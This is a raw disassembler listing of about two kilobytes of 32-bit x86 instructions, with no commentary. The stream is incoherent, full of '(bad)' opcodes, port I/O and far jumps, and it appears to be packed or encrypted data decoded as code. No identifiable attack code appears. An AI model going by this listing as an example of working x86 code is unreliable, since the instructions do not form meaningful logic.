  41875a:	inc    eax
  41875b:	repz adc eax,0x6b6d82bc
  418761:	scas   al,BYTE PTR es:[edi]
  418762:	xchg   ecx,eax
  418763:	fnstenv [ebx+edi*2+0x68]
  418767:	sbb    ch,BYTE PTR [ecx-0x75709408]
  41876d:	jl     0x418752
  41876f:	pushf  
  418770:	test   al,0x9
  418772:	push   0xffffff80
  418774:	jecxz  0x4187ab
  418776:	push   0x17fc93a1
  41877b:	bswap  edi
  41877d:	pop    esp
  41877e:	daa    
  41877f:	daa    
  418780:	cmp    BYTE PTR [eax+0x6e],ah
  418783:	out    0x9d,al
  418785:	pop    ss
  418786:	cli    
  418787:	sub    BYTE PTR ds:[ebp+0x3568559c],dl
  41878e:	ficomp DWORD PTR [esi+0x692094d4]
  418794:	push   esp
  418795:	xchg   ebp,eax
  418796:	add    edx,DWORD PTR [esi]
  418798:	xor    al,0x8f
  41879a:	mov    cl,0xe7
  41879c:	out    dx,eax
  41879d:	push   esp
  41879e:	and    al,0xe9
  4187a0:	sub    dh,BYTE PTR [esi+0x3712cbf9]
  4187a6:	fiadd  WORD PTR [ecx+esi*8-0x477dc25c]
  4187ad:	pop    es
  4187ae:	(bad)  
  4187af:	in     al,0x71
  4187b1:	or     eax,0xf11fc532
  4187b6:	jae    0x418777
  4187b8:	in     eax,dx
  4187b9:	jge    0x41881d
  4187bb:	xchg   ebx,eax
  4187bc:	cmc    
  4187bd:	sbb    bl,BYTE PTR [ecx-0x6852f292]
  4187c3:	cld    
  4187c4:	test   eax,esp
  4187c6:	mov    eax,0x33e5c9e2
  4187cb:	mov    ecx,0x823d1057
  4187d0:	sahf   
  4187d1:	mov    dl,0xeb
  4187d3:	adc    edx,DWORD PTR [edx+0x29]
  4187d6:	mov    bh,0x2f
  4187d8:	and    edx,ecx
  4187da:	add    ecx,DWORD PTR [ebp-0x1b0487d1]
  4187e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e1:	out    0x99,eax
  4187e3:	inc    DWORD PTR [eax+0x23]
  4187e6:	fs popf 
  4187e8:	loopne 0x418857
  4187ea:	hlt    
  4187eb:	aaa    
  4187ec:	stos   BYTE PTR es:[edi],al
  4187ed:	jmp    0xe36f:0x484939a4
  4187f4:	jae    0x41886e
  4187f6:	jp     0x418781
  4187f8:	mov    ebp,0x31a98b6d
  4187fd:	fs adc esp,edx
  418800:	repz and eax,0x56c780e2
  418806:	dec    ecx
  418807:	inc    esp
  418808:	push   ebp
  418809:	xchg   edi,eax
  41880a:	ins    DWORD PTR es:[edi],dx
  41880b:	add    edx,edi
  41880d:	push   eax
  41880e:	pop    ebx
  41880f:	test   eax,0x6e84f325
  418814:	jmp    0x70df66e9
  418819:	mov    edi,0xe355a1cd
  41881e:	ret    0xfa1f
  418821:	adc    ch,dl
  418823:	xlat   BYTE PTR ds:[ebx]
  418824:	mul    BYTE PTR ds:0x8021f4e2
  41882a:	and    eax,DWORD PTR [edx-0x57]
  41882d:	imul   sp,WORD PTR [ebx-0xc],0xffbb
  418832:	add    al,0xa9
  418834:	sar    ah,1
  418836:	cmp    DWORD PTR [eax+0x700e7e2],edx
  41883c:	outs   dx,DWORD PTR ds:[esi]
  41883d:	sub    edi,DWORD PTR [esi+ebp*1]
  418840:	aaa    
  418841:	mov    edx,0x848f6ab8
  418846:	ins    BYTE PTR es:[edi],dx
  418847:	mov    ebx,0x37fffaa4
  41884c:	retf   
  41884d:	out    0x3e,al
  41884f:	xor    al,0xef
  418851:	mov    eax,ds:0xd00f359d
  418856:	pop    esi
  418857:	inc    edx
  418858:	or     eax,0xc84c00de
  41885d:	jge    0x4188c5
  41885f:	pop    edx
  418860:	data16 scas al,BYTE PTR es:[edi]
  418862:	inc    ebp
  418863:	push   ecx
  418864:	dec    edi
  418865:	mov    ebx,0x5b61d02d
  41886a:	das    
  41886b:	or     DWORD PTR [ebx-0x59],ebx
  41886e:	in     eax,0xb7
  418870:	add    eax,0x4c725f6f
  418875:	test   BYTE PTR [ebp+0x58],ah
  418878:	push   ebx
  418879:	sbb    al,0x2
  41887b:	es call 0x9c0c:0x1b1a27ee
  418883:	sbb    al,0xee
  418885:	fnstenv [eax+eiz*8+0x6f06547e]
  41888c:	mov    ch,0xf7
  41888e:	(bad)  
  418890:	ret    
  418891:	mov    dh,0x9e
  418893:	je     0x418899
  418895:	cmp    DWORD PTR [edi+0x47a34115],ecx
  41889b:	into   
  41889c:	fimul  WORD PTR [ecx+0x20f47200]
  4188a2:	fmulp  st(6),st
  4188a4:	out    dx,al
  4188a5:	push   ss
  4188a6:	dec    edi
  4188a7:	mov    ds:0x1cbea6fe,al
  4188ac:	stos   BYTE PTR es:[edi],al
  4188ad:	jae    0x418925
  4188af:	ret    0x5cab
  4188b2:	aas    
  4188b3:	xlat   BYTE PTR ds:[ebx]
  4188b4:	cld    
  4188b5:	pusha  
  4188b6:	outs   dx,DWORD PTR ds:[esi]
  4188b7:	push   0x5741515c
  4188bc:	or     ecx,DWORD PTR [edx-0x6f]
  4188bf:	add    ebx,eax
  4188c1:	xor    al,al
  4188c3:	push   esi
  4188c4:	pop    eax
  4188c5:	xchg   DWORD PTR [eax+0x254dd54b],esp
  4188cb:	test   BYTE PTR [edx+0x6bf95806],ah
  4188d1:	cmp    eax,0x8941d908
  4188d6:	dec    edx
  4188d7:	outs   dx,DWORD PTR ds:[esi]
  4188d8:	int    0xe9
  4188da:	jae    0x4188be
  4188dc:	loopne 0x4188d7
  4188de:	mov    ecx,0x5ff9a650
  4188e3:	xchg   ebx,eax
  4188e4:	adc    ecx,DWORD PTR [edi]
  4188e6:	and    ebp,DWORD PTR [ebp-0x4d89d087]
  4188ec:	out    0xf0,eax
  4188ee:	fldln2 
  4188f0:	fisttp DWORD PTR ss:[ecx+0x7]
  4188f4:	sub    BYTE PTR [esi+0x772a177c],bl
  4188fa:	push   esp
  4188fb:	arpl   WORD PTR [ebx+0x4c3a8734],dx
  418901:	fst    DWORD PTR [ebx+0x5e]
  418904:	int    0xa4
  418906:	in     al,0x4a
  418908:	fldcw  WORD PTR [ebp-0x44]
  41890b:	pop    es
  41890c:	pop    ecx
  41890d:	ds retf 
  41890f:	in     al,0xb6
  418911:	stos   BYTE PTR es:[edi],al
  418912:	test   BYTE PTR [ebp-0x6a],bl
  418915:	push   ds
  418916:	inc    edi
  418917:	mov    ch,0x88
  418919:	fcomip st,st(5)
  41891b:	sar    BYTE PTR [edx-0x6b7a67ba],1
  418921:	jno    0x418935
  418923:	add    al,0x81
  418925:	nop
  418926:	faddp  st(1),st
  418928:	inc    ebp
  418929:	fbld   TBYTE PTR [esi-0x5e]
  41892c:	adc    DWORD PTR [edx+0x7d],edi
  41892f:	cmp    esp,ecx
  418931:	nop
  418932:	cwde   
  418933:	dec    esp
  418934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418935:	mov    al,0x3d
  418937:	loop   0x4189a0
  418939:	mov    ebx,esp
  41893b:	jae    0x418915
  41893d:	pop    edx
  41893e:	sub    DWORD PTR [esi-0x72],ebx
  418941:	and    al,0x57
  418943:	mov    esi,0xf1addc35
  418948:	into   
  418949:	pusha  
  41894a:	mov    ebx,0x7a55d14d
  41894f:	sub    cl,BYTE PTR [esi]
  418951:	jmp    0x41890a
  418953:	jno    0x418982
  418955:	cwde   
  418956:	dec    esi
  418957:	mov    bh,0x9e
  418959:	mov    ebx,0xce5e7ff9
  41895e:	(bad)  
  41895f:	fmul   DWORD PTR [edi-0x55d1a50a]
  418965:	out    0xbd,eax
  418967:	mov    eax,ds:0x192e19dd
  41896c:	pop    ss
  41896d:	adc    al,BYTE PTR [ebx-0x3d]
  418970:	mov    bl,0xf6
  418972:	mov    al,0x32
  418974:	in     eax,dx
  418975:	inc    ebx
  418976:	sti    
  418977:	mov    ebp,0x8015cb53
  41897c:	ins    BYTE PTR es:[edi],dx
  41897d:	sub    al,0x7c
  41897f:	out    dx,eax
  418980:	pushf  
  418981:	sub    eax,0xbf5cc61
  418986:	lods   al,BYTE PTR ds:[esi]
  418987:	mov    eax,0xa3c7fecd
  41898c:	div    BYTE PTR [ebp+0x6d]
  41898f:	test   eax,0xe51bfe94
  418994:	(bad)  
  418995:	nop
  418996:	not    edx
  418998:	or     cl,dh
  41899a:	mov    esp,0xf126e0ee
  41899f:	xchg   ebp,eax
  4189a0:	or     bl,cl
  4189a2:	lahf   
  4189a3:	dec    DWORD PTR [eax]
  4189a5:	repz add dl,bh
  4189a8:	mov    al,ds:0x8134b8f4
  4189ad:	push   ss
  4189ae:	lock mov eax,ds:0xd959cd7b
  4189b4:	push   0xdf3dfaf6
  4189b9:	imul   edi,DWORD PTR [edi+0x63],0xffffffb3
  4189bd:	dec    edx
  4189be:	fild   QWORD PTR [edi+0x3e]
  4189c1:	and    eax,0x44637e96
  4189c6:	stc    
  4189c7:	and    eax,0x6138478d
  4189cc:	push   ebx
  4189cd:	mov    al,0x5e
  4189cf:	or     ecx,esp
  4189d1:	mov    eax,ds:0xa2236e04
  4189d6:	outs   dx,DWORD PTR ds:[esi]
  4189d7:	cwde   
  4189d8:	cmp    al,0xbe
  4189da:	mov    ebx,0x649477e5
  4189df:	inc    esi
  4189e0:	aas    
  4189e1:	or     bh,cl
  4189e3:	popf   
  4189e4:	pushf  
  4189e5:	add    DWORD PTR [esi+0x52601ff8],eax
  4189eb:	rol    BYTE PTR ds:0x5c6e3968,cl
  4189f1:	inc    edi
  4189f2:	xchg   ebp,eax
  4189f3:	scas   al,BYTE PTR es:[edi]
  4189f4:	xor    eax,DWORD PTR [edi+0x2f8a4238]
  4189fa:	mov    cl,0x91
  4189fc:	sub    ch,dl
  4189fe:	ins    DWORD PTR es:[edi],dx
  4189ff:	cmp    ebp,DWORD PTR [edx]
  418a01:	dec    edi
  418a02:	adc    al,0xf7
  418a04:	dec    esp
  418a05:	sub    eax,0xfbce115f
  418a0a:	push   cs
  418a0b:	stos   BYTE PTR es:[edi],al
  418a0c:	test   al,0xbb
  418a0e:	pushf  
  418a0f:	mov    eax,0x17689a1a
  418a14:	fnstsw WORD PTR [ecx-0x26c65e3c]
  418a1a:	adc    eax,DWORD PTR [ecx+0x6e]
  418a1d:	pop    edi
  418a1e:	mov    edi,0x72cc982d
  418a23:	retf   0x20e0
  418a26:	cld    
  418a27:	inc    edx
  418a28:	pop    edi
  418a29:	dec    edi
  418a2a:	sub    eax,0x12ee9426
  418a2f:	inc    edi
  418a30:	scas   eax,DWORD PTR es:[edi]
  418a31:	add    ecx,DWORD PTR [eax-0x76b52542]
  418a37:	push   ds
  418a38:	out    0x1b,eax
  418a3a:	mov    edi,0xc6353519
  418a3f:	inc    eax
  418a40:	leave  
  418a41:	(bad)  
  418a42:	lea    edi,[esi-0x4a75b009]
  418a48:	pop    edi
  418a49:	pop    edi
  418a4a:	call   0x3f6d3a2c
  418a4f:	rcl    ch,cl
  418a51:	test   eax,0xc87f0306
  418a56:	out    0x8a,eax
  418a58:	and    eax,0xddb18137
  418a5d:	jns    0x418a80
  418a5f:	mov    DWORD PTR [eax+0x220d041b],esi
  418a65:	adc    eax,0xd54e3a56
  418a6a:	inc    eax
  418a6b:	test   esi,0x9e9c55b0
  418a71:	sub    bl,BYTE PTR [esi-0x56]
  418a74:	pop    ss
  418a75:	cld    
  418a76:	es in  eax,0x77
  418a79:	arpl   WORD PTR [ebp+0x3df47946],sp
  418a7f:	adc    dl,BYTE PTR [esi]
  418a81:	aam    0x66
  418a83:	scas   al,BYTE PTR es:[edi]
  418a84:	popa   
  418a85:	xchg   ebp,edi
  418a87:	lods   eax,DWORD PTR ds:[esi]
  418a88:	mov    DWORD PTR [edx+0x42b0921],edx
  418a8e:	push   ebp
  418a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a90:	or     esi,edi
  418a92:	rcl    BYTE PTR [esi],cl
  418a94:	aaa    
  418a95:	jnp    0x418ab0
  418a97:	jmp    0x6229:0x6274c936
  418a9e:	xchg   ebx,eax
  418a9f:	(bad)  
  418aa0:	sbb    ecx,DWORD PTR [esi]
  418aa2:	jp     0x418a6a
  418aa4:	or     dl,BYTE PTR [esi+0x5857b7e5]
  418aaa:	jne    0x418a38
  418aac:	jns    0x418ab4
  418aae:	pushaw 
  418ab0:	jle    0x418a57
  418ab2:	out    dx,al
  418ab3:	pop    edx
  418ab4:	mov    esi,0x37e46903
  418ab9:	sti    
  418aba:	fldcw  WORD PTR [eax]
  418abc:	sub    al,0xc9
  418abe:	icebp  
  418abf:	jge    0x418b2b
  418ac1:	sbb    BYTE PTR [ebx+0x76],0x59
  418ac5:	pop    esi
  418ac6:	mov    cl,BYTE PTR [eax-0x4d]
  418ac9:	pop    ebp
  418aca:	cmp    edi,ecx
  418acc:	ds mov edi,0xa9321236
  418ad2:	mov    ah,0x2f
  418ad4:	out    0xb2,al
  418ad6:	test   WORD PTR [ebx],bx
  418ad9:	pop    DWORD PTR [esi]
  418adb:	sub    DWORD PTR [eax],eax
  418add:	push   es
  418ade:	cmp    eax,0xe7d90324
  418ae3:	test   al,0xff
  418ae5:	mov    al,0x59
  418ae7:	nop
  418ae8:	xchg   esp,eax
  418ae9:	pop    ecx
  418aea:	ja     0x418ab3
  418aec:	and    al,0xf5
  418aee:	cmp    DWORD PTR [ebx+0x28],0x14e72d4e
  418af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418af6:	int3   
  418af7:	(bad)  
  418af8:	sbb    DWORD PTR [ebp-0x29],ecx
  418afb:	imul   bl
  418afd:	push   eax
  418afe:	pop    es
  418aff:	xor    eax,0xcd6645f6
  418b04:	jmp    0x55dd9d8f
  418b09:	scas   eax,DWORD PTR es:[edi]
  418b0a:	imul   esp,DWORD PTR [ebx],0x7d
  418b0d:	(bad)  
  418b0e:	popa   
  418b0f:	jmp    0xd63a0ed3
  418b14:	pop    esp
  418b15:	jno    0x418b81
  418b17:	int3   
  418b18:	repnz shl BYTE PTR [esi],cl
  418b1b:	jl     0x418b65
  418b1d:	fidivr WORD PTR [edi+eiz*8]
  418b20:	dec    eax
  418b21:	pop    edi
  418b22:	sub    dh,BYTE PTR [esi+eax*8]
  418b25:	add    eax,0xb232475e
  418b2a:	jno    0x418b96
  418b2c:	mov    ecx,0xc4930636
  418b31:	fcmovne st,st(5)
  418b33:	test   BYTE PTR [esp+esi*8-0x39],0x21
  418b38:	or     DWORD PTR [ecx+0x1c1b9eb0],ebp
  418b3e:	mov    esi,0x8cf46d08
  418b43:	xor    ecx,DWORD PTR [esi-0x13a4e5e0]
  418b49:	pop    es
  418b4a:	add    DWORD PTR [ebx+0x156e4ce8],ebp
  418b50:	jg     0x418b42
  418b52:	test   BYTE PTR ds:0x4001c4fe,dl
  418b58:	test   ecx,ecx
  418b5a:	fisttp DWORD PTR [edx]
  418b5c:	push   ss
  418b5d:	repnz loope 0x418ba2
  418b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b61:	(bad)  
  418b62:	int    0xf4
  418b64:	lahf   
  418b65:	ds je  0x418b19
  418b68:	clc    
  418b69:	sar    DWORD PTR [eax-0x2fb13c9c],0x94
  418b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b71:	cli    
  418b72:	fld1   
  418b74:	gs mov cl,0x1f
  418b77:	sub    al,0x54
  418b79:	cmp    ah,BYTE PTR [ebp+0x2f9ab242]
  418b7f:	aaa    
  418b80:	pop    edi
  418b81:	pop    ss
  418b82:	rcr    DWORD PTR [edi-0x16],0xca
  418b86:	cmp    eax,0xf9c7e145
  418b8b:	ins    BYTE PTR es:[edi],dx
  418b8c:	cmp    al,0x7f
  418b8e:	dec    edx
  418b8f:	xchg   ebx,eax
  418b90:	mov    edx,0xcc6c2114
  418b95:	dec    edx
  418b96:	repnz bound esi,QWORD PTR [edi+0x74]
  418b9a:	xor    bl,dl
  418b9c:	dec    esi
  418b9d:	push   eax
  418b9e:	ds leave 
  418ba0:	aam    0xe1
  418ba2:	mov    ah,0x41
  418ba4:	and    DWORD PTR [ebx+edx*1],ecx
  418ba7:	pop    esp
  418ba8:	add    al,0xe7
  418baa:	ins    BYTE PTR es:[edi],dx
  418bab:	fwait
  418bac:	inc    eax
  418bad:	mov    bl,0x70
  418baf:	xchg   esp,eax
  418bb0:	push   0x6d
  418bb2:	sti    
  418bb3:	daa    
  418bb4:	pop    ecx
  418bb5:	iret   
  418bb6:	stc    
  418bb7:	xchg   edi,eax
  418bb8:	or     DWORD PTR [edx+0x60],0x93d42db2
  418bbf:	jb     0x418b74
  418bc1:	in     al,dx
  418bc2:	adc    esi,edi
  418bc4:	mov    al,0x53
  418bc6:	mov    ds:0x626e2a1f,eax
  418bcb:	(bad)  
  418bcc:	in     eax,dx
  418bcd:	std    
  418bce:	push   ecx
  418bcf:	jo     0x418c06
  418bd1:	and    WORD PTR [ecx+eax*1+0x64],di
  418bd6:	cwde   
  418bd7:	mov    eax,0x472f6dc6
  418bdc:	ins    DWORD PTR es:[edi],dx
  418bdd:	and    al,0x77
  418bdf:	stos   DWORD PTR es:[edi],eax
  418be0:	xor    edx,DWORD PTR [ecx]
  418be2:	push   es
  418be3:	std    
  418be4:	enter  0xf1e4,0xf4
  418be8:	sar    DWORD PTR [esi],cl
  418bea:	push   edi
  418beb:	jo     0x418c45
  418bed:	lahf   
  418bee:	popf   
  418bef:	adc    eax,0x387e6cf8
  418bf4:	sub    ecx,ecx
  418bf6:	mov    ds:0x6847731b,eax
  418bfb:	mov    DWORD PTR [ecx+ecx*8-0x4],esp
  418bff:	sub    al,0x4d
  418c01:	shrd   esi,eax,0x34
  418c05:	add    al,0x8c
  418c07:	mov    eax,DWORD PTR [ecx+ebx*1-0x9bea72]
  418c0e:	pop    edi
  418c0f:	loope  0x418c23
  418c11:	push   edx
  418c12:	inc    ebp
  418c13:	pop    ebx
  418c14:	mov    ebx,0xd34b38e1
  418c19:	push   edx
  418c1a:	cli    
  418c1b:	rcl    bh,cl
  418c1d:	pop    ecx
  418c1e:	or     eax,0x8dc1c31a
  418c23:	adc    BYTE PTR [ecx-0x4dce423a],bh
  418c29:	adc    eax,0xec2b6838
  418c2e:	xchg   edx,eax
  418c2f:	inc    esi
  418c30:	or     ah,dh
  418c32:	stc    
  418c33:	mov    cl,ah
  418c35:	sub    eax,0xcfb1d551
  418c3a:	push   ebp
  418c3b:	mov    ?,WORD PTR [ebp-0x66bce6f1]
  418c41:	dec    ecx
  418c42:	out    0x31,al
  418c44:	and    ebx,DWORD PTR [eax-0x1d9e7645]
  418c4a:	xor    eax,0x214534f8
  418c4f:	shl    ecx,0xea
  418c52:	mov    bh,0x50
  418c54:	dec    esp
  418c55:	idiv   BYTE PTR [eax+eax*4]
  418c58:	mov    eax,ds:0x731426ec
  418c5d:	xor    DWORD PTR [ebx+0x65],edx
  418c60:	jge    0x418bf8
  418c62:	lahf   
  418c63:	mov    ebp,0x586914fb
  418c68:	cmp    al,0x41
  418c6a:	test   eax,0xc2ed6819
  418c6f:	jno    0x418c2d
  418c71:	sbb    al,0x7c
  418c73:	sbb    BYTE PTR [eax+0x18b8db7d],bh
  418c79:	lods   eax,DWORD PTR gs:[esi]
  418c7b:	inc    esi
  418c7c:	punpckhwd mm7,mm0
  418c7f:	pop    ss
  418c80:	mov    ds:0x79093d2d,eax
  418c85:	hlt    
  418c86:	cmp    eax,0x2274c7bc
  418c8b:	inc    esp
  418c8c:	cld    
  418c8d:	ins    DWORD PTR es:[edi],dx
  418c8e:	fwait
  418c8f:	pop    gs
  418c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c92:	mov    ds:0x5d1ced66,al
  418c97:	xlat   BYTE PTR ds:[ebx]
  418c98:	daa    
  418c99:	push   cs
  418c9a:	cmc    
  418c9b:	in     al,dx
  418c9c:	das    
  418c9d:	ret    
  418c9e:	sub    dh,BYTE PTR [eax-0x558bfc54]
  418ca4:	clc    
  418ca5:	jbe    0x418cbd
  418ca7:	pop    ss
  418ca8:	pop    DWORD PTR cs:[ebx]
  418cab:	pop    ebp
  418cac:	sub    eax,0x6e7821f0
  418cb1:	sbb    al,0x6d
  418cb3:	push   ebp
  418cb4:	jns    0x418d01
  418cb6:	test   al,0xe9
  418cb8:	push   edx
  418cb9:	xchg   esp,eax
  418cba:	lods   eax,DWORD PTR ds:[esi]
  418cbb:	xchg   edi,eax
  418cbc:	dec    edi
  418cbd:	retf   
  418cbe:	add    esp,DWORD PTR [edx-0x730cc1e5]
  418cc4:	push   eax
  418cc5:	mov    al,ds:0xfb0b623a
  418cca:	fdiv   QWORD PTR [ebx]
  418ccc:	fst    DWORD PTR [eax+0x32]
  418ccf:	adc    ch,BYTE PTR [esp+eiz*4+0x3330971d]
  418cd6:	leave  
  418cd7:	(bad)  
  418cd8:	aas    
  418cd9:	aam    0x8
  418cdb:	push   0x3f7d213d
  418ce0:	adc    al,0xc2
  418ce2:	push   cs
  418ce3:	push   es
  418ce4:	or     DWORD PTR [eax+eax*1+0x7138ce77],edi
  418ceb:	mov    ebp,0x5edd51e4
  418cf0:	push   edx
  418cf1:	inc    esp
  418cf2:	lods   eax,DWORD PTR ds:[esi]
  418cf3:	je     0x418cfe
  418cf5:	call   0x7554a53f
  418cfa:	div    DWORD PTR [eax-0x31]
  418cfd:	out    0x39,eax
  418cff:	cmp    al,0xd5
  418d01:	lock and ebp,DWORD PTR [eax+0x9647385]
  418d08:	fidivr DWORD PTR [edi-0x5c]
  418d0b:	cmp    BYTE PTR [ecx-0x2b],ah
  418d0e:	xchg   BYTE PTR [edi+0x2c],bh
  418d11:	repz adc eax,0x518e409f
  418d17:	mov    bh,dl
  418d19:	int3   
  418d1a:	jmp    0x418d34
  418d1c:	jl     0x418d0b
  418d1e:	repz ja 0x418d7c
  418d21:	lea    ebx,[edx+0x33fc46a]
  418d27:	(bad)  
  418d28:	ds pop ebx
  418d2a:	inc    ebx
  418d2b:	or     edi,DWORD PTR [eax]
  418d2d:	mov    ds:0x514007dc,eax
  418d32:	out    dx,al
  418d33:	ins    DWORD PTR es:[edi],dx
  418d34:	stc    
  418d35:	mov    cl,BYTE PTR [ebx-0x24]
  418d38:	mov    bh,dl
  418d3a:	xchg   esi,eax
  418d3b:	cmp    edx,esi
  418d3d:	add    eax,0x5d953d70
  418d42:	nop
  418d43:	ins    BYTE PTR es:[edi],dx
  418d44:	pop    eax
  418d45:	es or  bh,al
  418d48:	xor    DWORD PTR [edi-0xb],edi
  418d4b:	leave  
  418d4c:	mov    ds:0x6e812795,eax
  418d51:	cmp    al,0xe9
  418d53:	fst    QWORD PTR [edx+0x23c6d635]
  418d59:	ss dec ebp
  418d5b:	push   edi
  418d5c:	rcr    BYTE PTR [eax],cl
  418d5e:	dec    ebx
  418d5f:	lods   eax,DWORD PTR ds:[esi]
  418d60:	mov    ebx,0x22c7744e
  418d65:	push   ss
  418d66:	or     DWORD PTR [ebx+0x9a3ecf5],eax
  418d6c:	std    
  418d6d:	pop    esp
  418d6e:	not    BYTE PTR [ebx+0x5f]
  418d71:	pusha  
  418d72:	and    bl,BYTE PTR [ecx]
  418d74:	xchg   edx,eax
  418d75:	sub    al,0xc8
  418d77:	outs   dx,DWORD PTR ds:[esi]
  418d78:	xchg   DWORD PTR [ebx-0x4c],esp
  418d7b:	stos   DWORD PTR es:[edi],eax
  418d7c:	xor    BYTE PTR [esi],bl
  418d7e:	iret   
  418d7f:	jb     0x418db2
  418d81:	and    DWORD PTR [ebx-0x56],0x179bf144
  418d88:	pusha  
  418d89:	sbb    BYTE PTR [edi+ebx*8],ch
  418d8c:	test   DWORD PTR [ebp+0x37],edx
  418d8f:	xor    dl,BYTE PTR [ebx-0xde8a7b5]
  418d95:	adc    al,BYTE PTR [ebx]
  418d97:	mov    ecx,ebx
  418d99:	cli    
  418d9a:	fs push edi
  418d9c:	or     eax,0xe21113db
  418da1:	(bad)  
  418da2:	ja     0x418d53
  418da4:	je     0x418d4f
  418da6:	xchg   ebx,eax
  418da7:	push   eax
  418da8:	arpl   WORD PTR [edi-0x4a8c6b71],di
  418dae:	rcl    DWORD PTR [ebp+0x22],1
  418db1:	(bad)  
  418db3:	push   esp
  418db4:	dec    esp
  418db5:	sbb    eax,0x28131d1b
  418dba:	cs xchg esi,eax
  418dbc:	(bad)  
  418dbd:	jne    0x418d56
  418dbf:	mov    bh,0xb3
  418dc1:	mov    WORD PTR [edx],es
  418dc3:	jae    0x418d76
  418dc5:	mov    esp,0x610053ba
  418dca:	mov    ds:0x5915e503,eax
  418dcf:	jns    0x418d56
  418dd1:	xchg   DWORD PTR [edx],eax
  418dd3:	lds    esp,FWORD PTR [edx]
  418dd5:	(bad)  
  418dd6:	fstp   DWORD PTR [esi]
  418dd8:	mov    eax,0xd735077c
  418ddd:	pop    ebp
  418dde:	jae    0x418dbe
  418de0:	sahf   
  418de1:	cmp    ebx,esi
  418de3:	pop    ds
  418de4:	js     0x418de3
  418de6:	mov    dh,0x14
  418de8:	xor    BYTE PTR [edi],0x23
  418deb:	inc    edi
  418dec:	cdq    
  418ded:	cmp    DWORD PTR [eax+0x5fe95c94],ebx
  418df3:	fisubr WORD PTR [eax+0x4]
  418df6:	fbld   TBYTE PTR cs:[edi+0x5349c9f4]
  418dfd:	aas    
  418dfe:	push   ebx
  418dff:	retf   
  418e00:	sub    ch,BYTE PTR [edx-0x79]
  418e03:	jbe    0x418e1b
  418e05:	sub    BYTE PTR [ecx-0x18],0xc3
  418e09:	jnp    0x418e03
  418e0b:	xchg   esp,ebx
  418e0d:	jecxz  0x418d90
  418e0f:	ds push ecx
  418e11:	add    ebp,eax
  418e13:	inc    edx
  418e14:	outs   dx,DWORD PTR ds:[esi]
  418e15:	lods   al,BYTE PTR fs:[esi]
  418e17:	(bad)  [esi+eiz*2]
  418e1a:	and    al,0x84
  418e1c:	xor    ch,ch
  418e1e:	xor    al,ah
  418e20:	jge    0x418e56
  418e22:	cmp    DWORD PTR [eax],ebp
  418e24:	sub    DWORD PTR [edi+ecx*8],edi
  418e27:	test   ecx,esi
  418e29:	and    al,BYTE PTR [eax-0x21]
  418e2c:	aas    
  418e2d:	in     al,0xca
  418e2f:	loopne 0x418e38
  418e31:	pusha  
  418e32:	in     eax,dx
  418e33:	jg     0x418e23
  418e35:	dec    esi
  418e36:	js     0x418e7d
  418e38:	sub    eax,0x7d47975f
  418e3d:	lock xchg ebp,eax
  418e3f:	mov    ah,0x61
  418e41:	mov    edi,0x26508256
  418e46:	les    ebp,FWORD PTR [edx]
  418e48:	mov    dh,0x76
  418e4a:	outs   dx,DWORD PTR ds:[esi]
  418e4b:	add    eax,0xe210941e
  418e50:	dec    ebx
  418e51:	cld    
  418e52:	mov    eax,ds:0x7ef2f19c
  418e57:	pop    ds
  418e58:	test   BYTE PTR [edx+0xa],al
  418e5b:	xor    al,0x4d
  418e5d:	cli    
  418e5e:	fst    DWORD PTR [esi-0x1c]
  418e61:	or     ch,bh
  418e63:	outs   dx,BYTE PTR ds:[esi]
  418e64:	in     al,0x77
  418e66:	(bad)  
  418e67:	in     eax,0xcc
  418e69:	mov    edi,0x29f15124
  418e6e:	popf   
  418e6f:	daa    
  418e70:	xchg   ecx,eax
  418e71:	test   eax,0x2b5f5b4e
  418e76:	dec    ebx
  418e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e78:	push   esp
  418e79:	push   0xffffffc8
  418e7b:	adc    DWORD PTR [esi],0xffffff98
  418e7e:	xchg   edx,eax
  418e7f:	mov    cl,0xf6
  418e81:	(bad)  
  418e82:	fs inc ecx
  418e84:	xchg   ecx,eax
  418e85:	mov    ah,0xe6
  418e87:	pushf  
  418e88:	repnz es mov ebp,0xa0e5adec
  418e8f:	sub    al,0x93
  418e91:	lods   eax,DWORD PTR ds:[esi]
  418e92:	mov    ah,0xc0
  418e94:	xlat   BYTE PTR ds:[ebx]
  418e95:	inc    ebx
  418e96:	xchg   ebx,eax
  418e97:	cmp    ah,0x5d
  418e9a:	leave  
  418e9b:	jae    0x418e8f
  418e9d:	inc    edi
  418e9e:	pushf  
  418e9f:	test   al,0xbb
  418ea1:	push   esi
  418ea2:	mov    bh,0xa7
  418ea4:	cld    
  418ea5:	xchg   esp,eax
  418ea6:	daa    
  418ea7:	jg     0x418e53
  418ea9:	dec    esi
  418eaa:	out    dx,al
  418eab:	aad    0xfc
  418ead:	sub    al,0x6b
  418eaf:	dec    ecx
  418eb0:	jb     0x418eae
  418eb2:	mov    edx,0xb0d487cf
  418eb7:	mov    dl,0xa8
  418eb9:	or     eax,0xdb36b2d7
  418ebe:	(bad)  
  418ebf:	cmc    
  418ec0:	int    0xe3
  418ec2:	xor    ecx,DWORD PTR [ecx-0x4ba003c0]
  418ec8:	pop    ebx
  418ec9:	sbb    esp,DWORD PTR [ebx-0x71]
  418ecc:	shl    edi,cl
  418ece:	mov    edi,0xc9bce61e
  418ed3:	test   DWORD PTR [ecx],esi
  418ed5:	in     eax,dx
  418ed6:	fs push edi
  418ed8:	jmp    0x418f41
  418eda:	jmp    0x69a6:0xf6cdaab2
  418ee1:	sbb    eax,0xbe5c5d1d
  418ee6:	sub    al,0x8e
  418ee8:	xor    eax,0xced1d232
  418eed:	imul   edx,eax,0x9730e809
  418ef3:	popf   
  418ef4:	sub    ebp,0x59
  418ef7:	jmp    0x7a4de13a
  418efc:	mov    dh,0xf2
  418efe:	mov    ch,0x24
  418f00:	(bad)
  418f03:	fld    DWORD PTR ds:0xb62293cc
  418f09:	adc    ch,BYTE PTR [edx]
  418f0b:	test   eax,0x1e70b869
  418f10:	mov    dh,0xd1
  418f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f13:	popa   
  418f14:	call   0x74fc:0x329016e6
